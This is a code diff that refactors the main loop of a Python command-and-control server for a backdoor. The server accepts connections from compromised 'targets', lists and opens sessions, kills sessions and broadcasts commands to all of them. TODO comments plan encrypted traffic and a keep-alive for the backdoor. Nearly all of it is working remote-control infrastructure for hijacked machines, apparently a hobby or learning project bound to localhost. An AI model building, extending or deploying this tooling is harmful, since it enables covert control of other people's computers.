@@ -151,14 +151,37 @@ def accept_connections():
             targets.append(target)
             ips.append(ip)
             # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
-            print(Colour().green(str(ip) + " has connected!"))
-            print('[**] Command & Control Center: ', end="")
+            print(Colour().green(str(ip) + ' has connected!') +
+                  '\n[**] Command & Control Center: ', end="")
         except:
             pass
 
 
 # Work in progress (currently 'exit' command is buggy when issued from c2()
-def c2():
+# def c2():
+#
+# def exit_c2(targets, t1, sock):  # function of: elif command == 'exit':
+#     for target in targets:
+#         reliable_send(target, 'quit')
+#         target.close()
+#     sock.close()
+#     stop_flag = True
+#     t1.join()
+
+
+if __name__ == '__main__':
+    targets = []
+    ips = []
+    stop_flag = False
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('127.0.0.1', 5555))
+    sock.listen(5)
+    t1 = threading.Thread(target=accept_connections)
+    t1.start()
+    print(banner())
+    print('Run "help" command to see the usage manual')
+    print(Colour().green('[+] Waiting For The Incoming Connections ...'))
+
     while True:
         try:
             command = input('[**] Command & Control Center: ')
@@ -207,101 +230,15 @@ def c2():
             elif command[:4] == 'help':
                 c2_help_manual()
             else:
-                # print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
                 print(Colour().red('[!!] Command Doesnt Exist'))
         except (KeyboardInterrupt, SystemExit):
             if input('\nDo you want to exit? yes/no: ') == 'yes':
+                sock.close()
+                print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
                 break
         except ValueError as e:
-            print('[!!] ValueError: ' + str(e))
+            print(Colour().red('[!!] ValueError: ' + str(e)))
             continue
-        finally:
-            sock.close()
-            print('\n[-] C2 Socket Closed! Bye!!')
-
-
-def exit_c2(targets):  # function of: elif command == 'exit':
-    for target in targets:
-        reliable_send(target, 'quit')
-        target.close()
-    sock.close()
-    stop_flag = True
-    t1.join()
-    SystemExit()
-
-
-targets = []
-ips = []
-stop_flag = False
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 5555))  # sudo fuser -k 5555/tcp
-sock.listen(5)
-t1 = threading.Thread(target=accept_connections)
-t1.start()
-print(banner())
-print('Run "help" command to see the usage manual')
-print(Colour().green('[+] Waiting For The Incoming Connections ...'))
-
-# c2()
-
-# Command and control code (legacy)
-while True:
-    try:
-        command = input('[**] Command & Control Center: ')
-        if command == 'targets':
-            counter = 0
-            for ip in ips:
-                print('Session ' + str(counter) + ' --- ' + str(ip))
-                counter += 1
-        elif command == 'clear':
-            os.system('clear')
-        elif command[:7] == 'session':
-            try:
-                num = int(command[8:])
-                tarnum = targets[num]
-                tarip = ips[num]
-                target_communication(tarnum, tarip)
-            except:
-                print('[-] No Session Under That ID Number')
-        elif command == 'exit':
-            for target in targets:
-                reliable_send(target, 'quit')
-                target.close()
-            sock.close()
-            stop_flag = True
-            t1.join()
-            break
-        elif command[:4] == 'kill':
-            targ = targets[int(command[5:])]
-            ip = ips[int(command[5:])]
-            reliable_send(targ, 'quit')
-            targ.close()
-            targets.remove(targ)
-            ips.remove(ip)
-        elif command[:7] == 'sendall':
-            x = len(targets)
-            print(x)
-            i = 0
-            try:
-                while i < x:
-                    tarnumber = targets[i]
-                    print(tarnumber)
-                    reliable_send(tarnumber, command)
-                    i += 1
-            except:
-                print('Failed')
-        elif command[:4] == 'help':
-            c2_help_manual()
-        else:
-            print(Colour().red('[!!] Command Doesnt Exist'))
-    except (KeyboardInterrupt, SystemExit):
-        if input('\nDo you want to exit? yes/no: ') == 'yes':
-            sock.close()
-            print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
-            break
-    except ValueError as e:
-        print(Colour().red('[!!] ValueError: ' + str(e)))
-        continue
 
 # TODO: encrypt connection
 # TODO: Implement a 'pulse' feature between server and backdoor (Keep alive)
